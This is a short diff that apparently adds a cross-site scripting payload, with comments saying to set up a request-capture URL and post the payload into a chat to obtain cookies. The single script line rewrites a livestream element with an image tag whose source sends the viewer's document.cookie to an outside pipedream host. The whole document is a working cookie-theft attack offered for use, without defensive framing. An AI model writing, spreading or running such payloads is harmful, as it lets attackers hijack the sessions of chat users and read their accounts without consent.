@@ -1,0 +1,3 @@
+# create temporariy requestbin.com url to handle get request
+# send this to chat to get the cookie
+<SCRIPT>$('.livestream-video').html('<img src="https://enc8ujyhnhof.x.pipedream.net?cook='+document.cookie+'">')</SCRIPT>
